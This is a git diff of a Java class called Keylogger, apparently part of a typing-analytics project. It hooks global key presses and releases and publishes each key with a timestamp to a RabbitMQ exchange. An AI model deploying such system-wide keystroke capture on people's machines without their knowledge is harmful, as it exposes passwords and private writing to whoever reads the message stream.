@@ -3,6 +3,9 @@ package com.mibef108287.app;
 import java.io.IOException;
 import java.sql.Timestamp;
 
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 import com.rabbitmq.client.Channel;
@@ -11,6 +14,8 @@ import com.rabbitmq.client.ConnectionFactory;
 
 public class Keylogger implements NativeKeyListener{
   private final String EXCHANGE_NAME = "strokes";
+  private final int id = 1;
+  private final Logger logger = LoggerFactory.getLogger(Keylogger.class);
   private Channel channel; 
 
   public Keylogger() throws Exception{
@@ -25,17 +30,23 @@ public class Keylogger implements NativeKeyListener{
   public void nativeKeyPressed(NativeKeyEvent nativeEvent){
     try {
       String key = MyKeyEvent.getKeyText(nativeEvent.getKeyCode());
-      int id = 1; // Because we don't have login yet
-      String payload = String.format("{\"author\": {\"id\" : \"%d\"},\"pressedKey\": \"%s\", \"ts\": \"%s\"}", id, key, new Timestamp(System.currentTimeMillis()).toString());
-      channel.basicPublish(EXCHANGE_NAME,"",null,payload.getBytes());
+      channel.basicPublish(EXCHANGE_NAME,"",null,buildMessage(key, true).getBytes());
     } catch (IOException e) {
-      System.err.println(e);
-      // log this maybe
+      logger.error(e.getMessage());
     }
   }
 
   @Override
-  public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
-    
+  public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
+    try {
+      String key = MyKeyEvent.getKeyText(nativeEvent.getKeyCode());
+      channel.basicPublish(EXCHANGE_NAME,"",null,buildMessage(key, false).getBytes());
+    } catch (IOException e) {
+      logger.error(e.getMessage());
+    }
+  }
+
+  private String buildMessage(String key, boolean isKeyPress){
+    return String.format("{\"author\": {\"id\" : \"%d\"},\"keyValue\": \"%s\", \"isKeyPress\": \"%b\", \"ts\": \"%s\"}", id, key, isKeyPress, new Timestamp(System.currentTimeMillis()).toString());
   }
 }
